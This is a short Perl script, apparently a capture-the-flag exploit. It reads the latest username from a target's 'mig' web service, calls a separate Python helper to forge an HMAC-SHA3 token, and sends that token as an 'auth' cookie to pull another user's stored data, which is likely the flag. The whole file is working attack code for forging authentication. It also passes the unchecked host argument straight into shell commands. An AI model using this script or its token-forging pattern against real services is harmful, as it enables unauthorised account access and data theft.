#!/usr/bin/perl

$host=shift;

$stm='/usr/bin/curl -H "Host: mig.'.$host.'" -s http://'.$host.'/last/ | grep -oP \'"\K[^"]+\' | head -1 | tr \'\\n\' \' \'';
#print $stm."\n";
$ret=`$stm`;

#print $ret;
$user=$ret;

#print "USER:$user";

$stm2='/usr/bin/python2 /srv/exploits/mig/hmac_sha3.py '.$ret;
#print $stm2."\n";
$ret2=`$stm2`;
#print $ret2."\n";


$token=$ret2;
chomp $token;

$stm3='/usr/bin/curl -H "Host: mig.'.$host.'" -s http://'.$host."/form/ --cookie \"auth=$token:$user\"".' --data \'{"action":"load","fields":{},"state":""}\'';
#print $stm3."\n";

$ret3=`$stm3`;
print $ret3."\n"; 

#$ret3=$flag;

#/^\w{31}=$/
